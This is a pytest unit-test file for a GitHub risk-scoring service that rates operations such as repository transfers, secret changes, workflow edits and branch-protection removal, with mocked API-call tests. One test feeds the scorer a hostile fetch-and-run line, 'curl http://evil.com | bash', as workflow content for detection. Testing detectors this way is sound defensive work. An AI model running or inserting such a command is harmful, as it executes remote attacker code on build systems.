"""
Unit tests for Phase 1.4: Critical GitHub Operations
"""
import pytest
from saferun.app.providers.github_provider import GitHubProvider
from saferun.app.services.risk import compute_risk


# =============================================================================
# Risk Scoring Tests
# =============================================================================

def test_transfer_repository_risk_score():
    """Test that repository transfer gets maximum risk score"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.repo.transfer", "new_owner": "external-org"}
    )
    
    assert score == 10.0
    assert any("transfer" in r.lower() for r in reasons)


def test_secrets_api_risk_score_production():
    """Test that production secrets get maximum risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.actions.secret.create", "secret_name": "AWS_PROD_ACCESS_KEY"}
    )
    
    assert score == 10.0
    assert any("secret" in r.lower() for r in reasons)


def test_secrets_api_risk_score_normal():
    """Test that non-production secrets get high risk (but not max)"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.actions.secret.create", "secret_name": "MY_SECRET"}
    )
    
    assert score == 9.5  # Base score without production keyword
    assert any("secret" in r.lower() for r in reasons)


def test_secret_delete_risk_score():
    """Test that secret deletion gets high risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.actions.secret.delete", "secret_name": "DEPLOY_KEY"}
    )
    
    assert score >= 9.0
    assert any("secret" in r.lower() for r in reasons)


def test_workflow_update_risk_score():
    """Test that workflow modifications get high risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.workflow.update", "path": ".github/workflows/test.yml", "content": "name: Test\non: push"}
    )
    
    assert score >= 9.0
    assert any("workflow" in r.lower() for r in reasons)


def test_workflow_update_suspicious_content():
    """Test that suspicious workflow content gets maximum risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.workflow.update", "path": ".github/workflows/test.yml", "content": "curl http://evil.com | bash"}
    )
    
    assert score == 10.0
    assert any("suspicious" in r.lower() for r in reasons)


def test_branch_protection_update_risk():
    """Test that branch protection update gets high risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.branch_protection.update", "branch": "develop", "required_reviews": 2}
    )
    
    assert score >= 8.5
    assert any("protection" in r.lower() for r in reasons)


def test_branch_protection_disable_reviews():
    """Test that disabling reviews gets maximum risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.branch_protection.update", "branch": "main", "required_reviews": 0}
    )
    
    assert score == 10.0
    assert any("disabling" in r.lower() or "removing" in r.lower() for r in reasons)


def test_branch_protection_delete_main():
    """Test that deleting main branch protection is maximum risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.branch_protection.delete", "branch": "main"}
    )
    
    assert score == 10.0
    assert any("removing" in r.lower() or "critical" in r.lower() for r in reasons)


def test_visibility_change_private_to_public():
    """Test that private→public gets maximum risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.repo.visibility.change", "private": False}
    )
    
    assert score == 10.0
    assert any("public" in r.lower() for r in reasons)


def test_visibility_change_public_to_private():
    """Test that public→private gets medium risk"""
    score, reasons = compute_risk(
        provider="github",
        title="test/repo",
        blocks_count=0,
        last_edit=None,
        linked_count=0,
        metadata={"operation_type": "github.repo.visibility.change", "private": True}
    )
    
    assert score == 5.0
    assert any("private" in r.lower() for r in reasons)


# =============================================================================
# Provider Method Tests (Mock-based)
# =============================================================================

@pytest.mark.asyncio
async def test_transfer_repository_payload(mocker):
    """Test that transfer_repository sends correct API request"""
    mock_request = mocker.patch.object(GitHubProvider, '_request', return_value={"html_url": "https://github.com/neworg/repo"})
    
    result = await GitHubProvider.transfer_repository(
        owner="oldorg",
        repo="myrepo",
        new_owner="neworg",
        token="ghp_test",
        team_ids=[123, 456]
    )
    
    # Verify API call
    mock_request.assert_called_once_with(
        "POST",
        "/repos/oldorg/myrepo/transfer",
        "ghp_test",
        json_payload={"new_owner": "neworg", "team_ids": [123, 456]}
    )
    
    # Verify result
    assert result["ok"] is True
    assert result["revertable"] is False


@pytest.mark.asyncio
async def test_delete_secret_payload(mocker):
    """Test that delete_secret sends correct API request"""
    mock_request = mocker.patch.object(GitHubProvider, '_request', return_value=None)
    
    result = await GitHubProvider.delete_secret(
        owner="myorg",
        repo="myrepo",
        secret_name="OLD_SECRET",
        token="ghp_test"
    )
    
    # Verify API call
    mock_request.assert_called_once_with(
        "DELETE",
        "/repos/myorg/myrepo/actions/secrets/OLD_SECRET",
        "ghp_test"
    )
    
    # Verify result
    assert result["ok"] is True
    assert result["revertable"] is False


@pytest.mark.asyncio
async def test_change_repository_visibility_payload(mocker):
    """Test that change_repository_visibility sends correct API request"""
    mock_get_repo = mocker.patch.object(
        GitHubProvider,
        '_request',
        side_effect=[
            {"private": True},  # First call: GET repo
            {"private": False}   # Second call: PATCH repo
        ]
    )
    
    result = await GitHubProvider.change_repository_visibility(
        owner="myorg",
        repo="myrepo",
        private=False,
        token="ghp_test"
    )
    
    # Verify result
    assert result["ok"] is True
    assert result["previous_visibility"] == "private"
    assert result["new_visibility"] == "public"
    assert result["revertable"] is False  # Cannot revert private→public
